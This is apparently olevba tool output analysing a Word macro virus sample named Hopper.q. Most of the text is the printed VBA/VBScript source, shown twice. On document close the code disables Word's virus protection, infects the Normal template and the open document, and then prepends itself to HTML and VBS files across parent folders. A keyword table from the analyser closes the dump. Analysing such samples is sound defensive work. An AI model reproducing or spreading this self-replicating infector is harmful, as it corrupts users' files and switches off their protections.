olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Hopper.q-fc2b825b34e068a835b8d658fd3f01faff9aaf55
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Hopper.q-fc2b825b34e068a835b8d658fd3f01faff9aaf55 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Модуль1.bas 
in file: Virus.MSOffice.Hopper.q-fc2b825b34e068a835b8d658fd3f01faff9aaf55 - OLE stream: 'Macros/VBA/Модуль1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<html><!--kiss-->
'<BODY>
'<script language="VBScript"><!--

Private FSO, NT, InfType, HostPath, Target, NextLine, TempFile

'Private Sub WscriptCode
   On Error Resume Next
   HostType = 3
   HostPath = Wscript.ScriptFullName
   Call GotoWord
   Call FindHTMVBS
'End Sub

Private Sub Window_Onload()
   Dim FSO, CurrentPath, folder, fc, f1
   If location.protocol = "file:" Then
      Set FSO = CreateObject("Scripting.FileSystemObject")
      HostPath = Replace(location.href, "file:///", "")
      HostPath = Replace(HostPath, "/", "\")
      HostType = 2
      Call GotoWord
      Call FindHTMVBS
   End If
End Sub

Private Sub GotoWord()
   Set WordObj = CreateObject("Word.Application")
   Set NT = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule
   If NT.Lines(1, 1) <> "'<html><!--kiss-->" Then
      WordObj.Options.SaveNormalPrompt = False
      NT.DeleteLines 1, NT.CountOfLines
      NT.Addfromfile HostPath
      NT.DeleteLines 156, (NT.CountOfLines - 155)
      If HostType = 2 Then
         For j = 1 To 3
            NT.ReplaceLine j, "'" + NT.Lines(j, 1)
         Next
         For j = 153 To 155
            NT.ReplaceLine j, "'" + NT.Lines(j, 1)
            Next
      Else
         NT.ReplaceLine 7, Mid(NT.Lines(7, 1), 2)
         NT.ReplaceLine 13, Mid(NT.Lines(13, 1), 2)
      End If
   End If
   Set NT = Nothing
   WordObj.Quit
End Sub

Private Sub FindHTMVBS()
   Set FSO = CreateObject("Scripting.FileSystemObject")
   CurrentPath = FSO.GetParentFolderName(HostPath)
   Set folder = FSO.GetFolder(cpath)
   While folder.IsRootFolder = False
      Set folder = FSO.GetFolder(CurrentPath)
      Set fc = folder.Files
      cpath = FSO.GetParentFolderName(CurrentPath)
      For Each Target In fc
         InfExt = Lcase(FSO.GetExtensionName(Target.name)) = "html"
         If (InfExt = "html" Or InfExt = "htm" Or InfExt = "vbs") And Target.path <> HostName Then
            Set fh = FSO.opentextfile(Target.path, 1, True)
            TestString = fh.ReadLine
            fh.close
            If TestString <> "<html><!--kiss-->" And TestString <> "'<html><!--kiss-->" Then
               TempFile = FSO.GetTempName
               FSO.CopyFile Target.path, TempFile
               Set ft = FSO.opentextfile(Target.path, 2, True)
               If HostType = 1 Then
                  For j = 1 To 155
                      NextLine = NT.Lines(j, 1)
                      Call CheckLine(j)
                      ft.WriteLine NextLine
                  Next
               Else
                  Set fh = FSO.opentextfile(HostPath, 1, True)
                  For j = 1 To 155
                      NextLine = fh.ReadLine
                      Call CheckLine(j)
                      ft.WriteLine NextLine
                  Next
                  fh.close
               End If
               ft.close
               Set fh = FSO.opentextfile(TempFile, 1, True)
               Set ft = FSO.opentextfile(Target.path, 8, True)
               Do While fh.AtEndOfStream <> True
                  ft.WriteLine fh.ReadLine
               Loop
               ft.close
               fh.close
               FSO.DeleteFile TempFile
            End If
         End If
      Next
   Wend
End Sub

Private Sub CheckLine(LineNumber)
   If HostType = 1 Then
      If InfType = "htm" Then
         If LineNumber < 4 Or LineNumber > 152 Then
            NextLine = Mid(NextLine, 2)
         End If
      Else
         If LineNumber = 7 Or LineNumber = 13 Then
            NextLine = "'" + NextLine
         End If
      End If
   ElseIf HostType = 2 Then
      If InfType = "vbs" Then
         If LineNumber < 4 Or LineNumber > 152 Then
            NextLine = "'" + NextLine
         End If
         If LineNumber = 7 Or LineNumber = 13 Then
            NextLine = "'" + NextLine
         End If
      End If
   Else
      If InfType = "htm" Then
         If LineNumber < 4 Or LineNumber > 152 Then
            NextLine = Mid(NextLine, 2)
         End If
         If LineNumber = 7 Or LineNumber = 13 Then
            NextLine = Mid(NextLine, 2)
         End If
      End If
   End If
End Sub

Private Sub Document_Close()
   On Error Resume Next
   Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
   Options.VirusProtection = False
   Options.ConfirmConversions = False
   Options.SaveNormalPrompt = False
   If NT.Lines(1, 1) <> "'<html><!--kiss-->" Then
      For i = 1 To 155
         NT.InsertLines i, AD.Lines(i, 1)
      Next
   End If
   If AD.Lines(1, 1) <> "'<html><!--kiss-->" Then
      For i = 1 To 155
         AD.InsertLines i, NT.Lines(i, 1)
      Next
   End If
   HostType = 1
   HostPath = "C:\Windows\Web\Afile.htm"
   Call FindHTMVBS
End Sub

'--></script>
'</BODY>
'</HTML>
-------------------------------------------------------------------------------
VBA MACRO Модуль2.bas 
in file: Virus.MSOffice.Hopper.q-fc2b825b34e068a835b8d658fd3f01faff9aaf55 - OLE stream: 'Macros/VBA/Модуль2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Модуль3.bas 
in file: Virus.MSOffice.Hopper.q-fc2b825b34e068a835b8d658fd3f01faff9aaf55 - OLE stream: 'Macros/VBA/Модуль3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<html><!--kiss-->
'<BODY>
'<script language="VBScript"><!--

Private FSO, NT, InfType, HostPath, Target, NextLine, TempFile

'Private Sub WscriptCode
   On Error Resume Next
   HostType = 3
   HostPath = Wscript.ScriptFullName
   Call GotoWord
   Call FindHTMVBS
'End Sub

Private Sub Window_Onload()
   Dim FSO, CurrentPath, folder, fc, f1
   If location.protocol = "file:" Then
      Set FSO = CreateObject("Scripting.FileSystemObject")
      HostPath = Replace(location.href, "file:///", "")
      HostPath = Replace(HostPath, "/", "\")
      HostType = 2
      Call GotoWord
      Call FindHTMVBS
   End If
End Sub

Private Sub GotoWord()
   Set WordObj = CreateObject("Word.Application")
   Set NT = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule
   If NT.Lines(1, 1) <> "'<html><!--kiss-->" Then
      WordObj.Options.SaveNormalPrompt = False
      NT.DeleteLines 1, NT.CountOfLines
      NT.Addfromfile HostPath
      NT.DeleteLines 156, (NT.CountOfLines - 155)
      If HostType = 2 Then
         For j = 1 To 3
            NT.ReplaceLine j, "'" + NT.Lines(j, 1)
         Next
         For j = 153 To 155
            NT.ReplaceLine j, "'" + NT.Lines(j, 1)
            Next
      Else
         NT.ReplaceLine 7, Mid(NT.Lines(7, 1), 2)
         NT.ReplaceLine 13, Mid(NT.Lines(13, 1), 2)
      End If
   End If
   Set NT = Nothing
   WordObj.Quit
End Sub

Private Sub FindHTMVBS()
   Set FSO = CreateObject("Scripting.FileSystemObject")
   CurrentPath = FSO.GetParentFolderName(HostPath)
   Set folder = FSO.GetFolder(cpath)
   While folder.IsRootFolder = False
      Set folder = FSO.GetFolder(CurrentPath)
      Set fc = folder.Files
      cpath = FSO.GetParentFolderName(CurrentPath)
      For Each Target In fc
         InfExt = Lcase(FSO.GetExtensionName(Target.name)) = "html"
         If (InfExt = "html" Or InfExt = "htm" Or InfExt = "vbs") And Target.path <> HostName Then
            Set fh = FSO.opentextfile(Target.path, 1, True)
            TestString = fh.ReadLine
            fh.close
            If TestString <> "<html><!--kiss-->" And TestString <> "'<html><!--kiss-->" Then
               TempFile = FSO.GetTempName
               FSO.CopyFile Target.path, TempFile
               Set ft = FSO.opentextfile(Target.path, 2, True)
               If HostType = 1 Then
                  For j = 1 To 155
                      NextLine = NT.Lines(j, 1)
                      Call CheckLine(j)
                      ft.WriteLine NextLine
                  Next
               Else
                  Set fh = FSO.opentextfile(HostPath, 1, True)
                  For j = 1 To 155
                      NextLine = fh.ReadLine
                      Call CheckLine(j)
                      ft.WriteLine NextLine
                  Next
                  fh.close
               End If
               ft.close
               Set fh = FSO.opentextfile(TempFile, 1, True)
               Set ft = FSO.opentextfile(Target.path, 8, True)
               Do While fh.AtEndOfStream <> True
                  ft.WriteLine fh.ReadLine
               Loop
               ft.close
               fh.close
               FSO.DeleteFile TempFile
            End If
         End If
      Next
   Wend
End Sub

Private Sub CheckLine(LineNumber)
   If HostType = 1 Then
      If InfType = "htm" Then
         If LineNumber < 4 Or LineNumber > 152 Then
            NextLine = Mid(NextLine, 2)
         End If
      Else
         If LineNumber = 7 Or LineNumber = 13 Then
            NextLine = "'" + NextLine
         End If
      End If
   ElseIf HostType = 2 Then
      If InfType = "vbs" Then
         If LineNumber < 4 Or LineNumber > 152 Then
            NextLine = "'" + NextLine
         End If
         If LineNumber = 7 Or LineNumber = 13 Then
            NextLine = "'" + NextLine
         End If
      End If
   Else
      If InfType = "htm" Then
         If LineNumber < 4 Or LineNumber > 152 Then
            NextLine = Mid(NextLine, 2)
         End If
         If LineNumber = 7 Or LineNumber = 13 Then
            NextLine = Mid(NextLine, 2)
         End If
      End If
   End If
End Sub

Private Sub Document_Close()
   On Error Resume Next
   Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
   Options.VirusProtection = False
   Options.ConfirmConversions = False
   Options.SaveNormalPrompt = False
   If NT.Lines(1, 1) <> "'<html><!--kiss-->" Then
      For i = 1 To 155
         NT.InsertLines i, AD.Lines(i, 1)
      Next
   End If
   If AD.Lines(1, 1) <> "'<html><!--kiss-->" Then
      For i = 1 To 155
         AD.InsertLines i, NT.Lines(i, 1)
      Next
   End If
   HostType = 1
   HostPath = "C:\Windows\Web\Afile.htm"
   Call FindHTMVBS
End Sub

'--></script>
'</BODY>
'</HTML>
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

